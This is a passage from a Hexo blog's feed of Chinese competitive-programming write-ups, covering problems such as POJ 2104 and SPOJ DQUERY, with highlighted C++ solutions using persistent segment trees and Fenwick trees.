class="keyword">while</span>(x) &#123;</div><div class="line">        ret += sum[ln[use[x]]];</div><div class="line">        x -= lowbit(x);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> ret;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> u, <span class="keyword">int</span> v, <span class="keyword">int</span> lr, <span class="keyword">int</span> rr, <span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> k)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span> l;</div><div class="line">    <span class="keyword">int</span> m = l + r &gt;&gt; <span class="number">1</span>;</div><div class="line">    <span class="keyword">int</span> tmp = get_sum(v) - get_sum(u) + sum[ln[rr]] - sum[ln[lr]];</div><div class="line">    <span class="keyword">if</span> (tmp &gt;= k) &#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = u; i; i -= lowbit(i)) use[i] = ln[use[i]];</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = v; i; i -= lowbit(i)) use[i] = ln[use[i]];</div><div class="line">        <span class="keyword">return</span> query(u, v, ln[lr], ln[rr], lson, k);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = u; i; i -= lowbit(i)) use[i] = rn[use[i]];</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = v; i; i -= lowbit(i)) use[i] = rn[use[i]];</div><div class="line">        <span class="keyword">return</span> query(u, v, rn[lr], rn[rr], rson, k - tmp);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> p, <span class="keyword">int</span> d)</span> </span>&#123;</div><div class="line">    <span class="keyword">while</span>(x &lt;= n) &#123;</div><div class="line">        S[x] = update(S[x], <span class="number">1</span>, m, p, d);</div><div class="line">        x += lowbit(x);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> t, q;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;t);</div><div class="line">    <span class="keyword">while</span>(t--) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;n, &amp;q);</div><div class="line">        m = tot = <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, a + i);</div><div class="line">            Hash[++m] = a[i];</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">char</span> s[<span class="number">10</span>];</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; q; i++) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%s"</span>, s);</div><div class="line">            <span class="keyword">if</span> (s[<span class="number">0</span>] == <span class="string">'Q'</span>) &#123;</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;op[i].l, &amp;op[i].r, &amp;op[i].k);</div><div class="line">                op[i].Q = <span class="number">1</span>;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;op[i].l, &amp;op[i].r);</div><div class="line">                op[i].Q = <span class="number">0</span>;</div><div class="line">                Hash[++m] = op[i].r;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        sort(Hash + <span class="number">1</span>, Hash + m + <span class="number">1</span>);</div><div class="line">        m = unique(Hash + <span class="number">1</span>, Hash + m + <span class="number">1</span>) - Hash - <span class="number">1</span>;</div><div class="line">        root[<span class="number">0</span>] = build(<span class="number">1</span>, m);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) root[i] = update(root[i - <span class="number">1</span>], <span class="number">1</span>, m, lower_bound(Hash + <span class="number">1</span>, Hash + m + <span class="number">1</span>, a[i]) - Hash, <span class="number">1</span>);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) S[i] = root[<span class="number">0</span>];</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; q; i++) &#123;</div><div class="line">            <span class="keyword">if</span> (op[i].Q) &#123;</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = op[i].l - <span class="number">1</span>; j; j -= lowbit(j)) use[j] = S[j];</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = op[i].r; j; j -= lowbit(j)) use[j] = S[j];</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, Hash[query(op[i].l - <span class="number">1</span>, op[i].r, root[op[i].l - <span class="number">1</span>], root[op[i].r], <span class="number">1</span>, m, op[i].k)]);</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                modify(op[i].l, lower_bound(Hash + <span class="number">1</span>, Hash + m + <span class="number">1</span>, a[op[i].l]) - Hash, <span class="number">-1</span>);</div><div class="line">                modify(op[i].l, lower_bound(Hash + <span class="number">1</span>, Hash + m + <span class="number">1</span>, op[i].r) - Hash, <span class="number">1</span>);</div><div class="line">                a[op[i].l] = op[i].r;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;p&gt;源地址：&lt;a href=&quot;http://acm.zju.edu.cn/onlinejudge/showProblem.do?problemCode=2112&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://acm.zju.edu.cn/onlinejudge/showProblem.do?problemCode=2112&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;题意&quot;&gt;&lt;a href=&quot;#题意&quot; class=&quot;headerlink&quot; title=&quot;题意&quot;&gt;&lt;/a&gt;题意&lt;/h1&gt;&lt;p&gt;动态查询区间第K大数，带修改&lt;/p&gt;
&lt;h1 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/Empress/p/4659824.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/Empress/p/4659824.html&lt;/a&gt;&lt;br&gt;需要将询问离线处理，将一开始的数列用主席树维护。之后修改的部分用N个树状数组来维护，每次更新logn棵树。&lt;br&gt;时间复杂度：nlog^2n&lt;br&gt;
    
    </summary>
    
      <category term="ACM" scheme="http://yoursite.com/categories/ACM/"/>
    
    
      <category term="数据结构" scheme="http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
      <category term="树状数组" scheme="http://yoursite.com/tags/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"/>
    
      <category term="主席树" scheme="http://yoursite.com/tags/%E4%B8%BB%E5%B8%AD%E6%A0%91/"/>
    
  </entry>
  
  <entry>
    <title>POJ2104 K-th Number（静态区间第K大 主席树）</title>
    <link href="http://yoursite.com/2015/10/22/POJ2104/"/>
    <id>http://yoursite.com/2015/10/22/POJ2104/</id>
    <published>2015-10-22T14:00:00.000Z</published>
    <updated>2017-10-01T02:36:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>源地址：<a href="http://poj.org/problem?id=2104" target="_blank" rel="external">http://poj.org/problem?id=2104</a></p><h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>静态查询区间第K大数</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p><a href="http://www.cnblogs.com/Empress/p/4652449.html" target="_blank" rel="external">http://www.cnblogs.com/Empress/p/4652449.html</a><br>主席数利用函数式线段树来维护数列，即每一个前缀维护一个线段树。再利用两个相邻的线段树只需要修改log级别，所以空间也能开下。一般用来解决区间第k大问题</p><a id="more"></a><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 1 &lt;&lt; 30</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> fi first</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> se second</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> debug puts(<span class="meta-string">"====================="</span>);</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> lson l, m</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> rson m + 1, r</span></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e5</span> + <span class="number">5</span>;</div><div class="line"><span class="keyword">int</span> ln[N &lt;&lt; <span class="number">5</span>], rn[N &lt;&lt; <span class="number">5</span>], sum[N &lt;&lt; <span class="number">5</span>];</div><div class="line"><span class="keyword">int</span> tot;</div><div class="line"><span class="keyword">int</span> a[N], root[N], b[N];</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> rt = ++tot;</div><div class="line">    sum[rt] = <span class="number">0</span>;</div><div class="line">    <span class="keyword">if</span> (l &lt; r) &#123;</div><div class="line">        <span class="keyword">int</span> m = l + r &gt;&gt; <span class="number">1</span>;</div><div class="line">        ln[rt] = build(lson);</div><div class="line">        rn[rt] = build(rson);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> rt;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> pre, <span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> x)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> rt = ++tot;</div><div class="line">    ln[rt] = ln[pre], rn[rt] = rn[pre], sum[rt] = sum[pre] + <span class="number">1</span>;</div><div class="line">    <span class="keyword">if</span> (l &lt; r) &#123;</div><div class="line">        <span class="keyword">int</span> m = l + r &gt;&gt; <span class="number">1</span>;</div><div class="line">        <span class="keyword">if</span> (x &lt;= m) ln[rt] = update(ln[pre], lson, x);</div><div class="line">        <span class="keyword">else</span> rn[rt] = update(rn[pre], rson, x);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> rt;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> u, <span class="keyword">int</span> v, <span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> k)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span> l;</div><div class="line">    <span class="keyword">int</span> m = l + r &gt;&gt; <span class="number">1</span>;</div><div class="line">    <span class="keyword">int</span> num = sum[ln[v]] - sum[ln[u]];</div><div class="line">    <span class="keyword">if</span> (num &gt;= k) <span class="keyword">return</span> query(ln[u], ln[v], lson, k);</div><div class="line">    <span class="keyword">else</span> <span class="keyword">return</span> query(rn[u], rn[v], rson, k - num);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</div><div class="line">    tot = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> n, m;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;n, &amp;m);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) <span class="built_in">scanf</span>(<span class="string">"%d"</span>, a + i), b[i] = a[i];</div><div class="line">    sort(b + <span class="number">1</span>, b + n + <span class="number">1</span>);</div><div class="line">    <span class="keyword">int</span> cnt = unique(b + <span class="number">1</span>, b + n + <span class="number">1</span>) - b - <span class="number">1</span>;</div><div class="line">    root[<span class="number">0</span>] = build(<span class="number">1</span>, cnt);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</div><div class="line">        <span class="keyword">int</span> x = lower_bound(b + <span class="number">1</span>, b + n + <span class="number">1</span>, a[i]) - b;</div><div class="line">        root[i] = update(root[i - <span class="number">1</span>], <span class="number">1</span>, cnt, x);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">while</span>(m--) &#123;</div><div class="line">        <span class="keyword">int</span> l, r, k;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;l, &amp;r, &amp;k);</div><div class="line">        <span class="keyword">int</span> x = query(root[l - <span class="number">1</span>], root[r], <span class="number">1</span>, cnt, k);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, b[x]);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;p&gt;源地址：&lt;a href=&quot;http://poj.org/problem?id=2104&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://poj.org/problem?id=2104&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;题意&quot;&gt;&lt;a href=&quot;#题意&quot; class=&quot;headerlink&quot; title=&quot;题意&quot;&gt;&lt;/a&gt;题意&lt;/h1&gt;&lt;p&gt;静态查询区间第K大数&lt;/p&gt;
&lt;h1 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/Empress/p/4652449.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/Empress/p/4652449.html&lt;/a&gt;&lt;br&gt;主席数利用函数式线段树来维护数列，即每一个前缀维护一个线段树。再利用两个相邻的线段树只需要修改log级别，所以空间也能开下。一般用来解决区间第k大问题&lt;/p&gt;
    
    </summary>
    
      <category term="ACM" scheme="http://yoursite.com/categories/ACM/"/>
    
    
      <category term="数据结构" scheme="http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
      <category term="主席树" scheme="http://yoursite.com/tags/%E4%B8%BB%E5%B8%AD%E6%A0%91/"/>
    
  </entry>
  
  <entry>
    <title>SPOJ DQUERY - D-query（查询区间内有几个数 离线树状数组OR在线主席树）</title>
    <link href="http://yoursite.com/2015/10/22/SPOJ-DQUERY/"/>
    <id>http://yoursite.com/2015/10/22/SPOJ-DQUERY/</id>
    <published>2015-10-22T05:40:00.000Z</published>
    <updated>2017-10-01T02:36:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>源地址：<a href="http://www.spoj.com/problems/DQUERY/en/" target="_blank" rel="external">http://www.spoj.com/problems/DQUERY/en/</a></p><h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>查询区间内有几个不同的数</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p><a href="http://blog.csdn.net/acm_cxlove/article/details/8562634" target="_blank" rel="external">http://blog.csdn.net/acm_cxlove/article/details/8562634</a></p><ol><li><p>离线树状数组<br>将查询区间按左端点排序<br>对于相同的数，先更新最左边的位置<br>然后根据查询区间，不断更新next，保证查询区间内只记录一个位置<br>维护前缀和用树状数组，时空效率都高</p></li><li><p>在线主席树<br><a href="http://www.cnblogs.com/Empress/p/4675386.html" target="_blank" rel="external">http://www.cnblogs.com/Empress/p/4675386.html</a><br>将重复的元素建树。在query的时候把区间内重复的数加起来，用区间长度(r-l+1)去减就是答案<br>(query的是[l, r]之间重复元素的个数)<br>举个例子：1 1 2 1 3 2 3<br>我们从左到右枚举，如果没有重复的，那么树的形态和之前一样，出现重复的则在重复的位置加1，建一颗新树<br>这样我们需要建7颗数<br> 1 2 3 4 5 6 7<br>T0:<br>T1:<br>T2: 1<br>T3: 1<br>T4: 1 1<br>T5: 1 1<br>T6: 1 1 1<br>T7: 1 1 1  1<br>例如查询区间[2，5] 就需要用T5-T1，但是不能直接减，直接减重复的数为2个1。需要统计的是区间[2,5]内重复的个数，正好为1个1.</p></li></ol><a id="more"></a><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>离线树状数组<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 1 &lt;&lt; 30</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> fi first</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> se second</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> debug puts(<span class="meta-string">"====================="</span>);</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">30000</span> + <span class="number">100</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> M = <span class="number">200000</span> + <span class="number">100</span>;</div><div class="line"><span class="keyword">int</span> a[N], s[N], n, nxt[N];</div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></div><div class="line">    <span class="keyword">int</span> l, r, id;</div><div class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> node &amp; T) <span class="keyword">const</span> &#123;</div><div class="line">        <span class="keyword">return</span> l &lt; T.l;</div><div class="line">    &#125;</div><div class="line">&#125; Q[M];</div><div class="line"><span class="keyword">int</span> ans[M];</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">lowbit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> x &amp; -x;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> v)</span> </span>&#123;</div><div class="line">    <span class="keyword">while</span>(p &lt;= n) &#123;</div><div class="line">        s[p] += v;</div><div class="line">        p += lowbit(p);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> p)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span>(p &gt; <span class="number">0</span>) &#123;</div><div class="line">        res += s[p];</div><div class="line">        p -= lowbit(p);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"><span class="built_in">map</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; mp;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n)) &#123;</div><div class="line">        mp.clear();</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, a + i);</div><div class="line">            <span class="keyword">if</span> (!mp.count(a[i])) &#123;</div><div class="line">                mp[a[i]] = i;</div><div class="line">                add(i, <span class="number">1</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        mp.clear();</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;= <span class="number">1</span>; i--) &#123;</div><div class="line">            <span class="keyword">if</span> (!mp.count(a[i])) nxt[i] = n + <span class="number">1</span>;</div><div class="line">            <span class="keyword">else</span> nxt[i] = mp[a[i]];</div><div class="line">            mp[a[i]] = i;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> q;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;q);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; q; i++) &#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;Q[i].l, &amp;Q[i].r);</div><div class="line">            Q[i].id = i;</div><div class="line">        &#125;</div><div class="line">        sort(Q, Q + q);</div><div class="line">        <span class="keyword">int</span> t = <span class="number">1</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; q; i++) &#123;</div><div class="line">            <span class="keyword">while</span>(t &lt;= n &amp;&amp; t &lt; Q[i].l) &#123;</div><div class="line">                add(nxt[t++], <span class="number">1</span>);</div><div class="line">            &#125;</div><div class="line">            ans[Q[i].id] = sum(Q[i].r) - sum(Q[i].l - <span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; q; i++) <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, ans[i]);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>在线主席树<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 1 &lt;&lt; 30</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> fi first</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> se second</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> debug puts(<span class="meta-string">"====================="</span>);</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> LL;</div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> lson l, m</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> rson m + 1, r</span></div><div class="line"><span class="keyword">const</span> <span 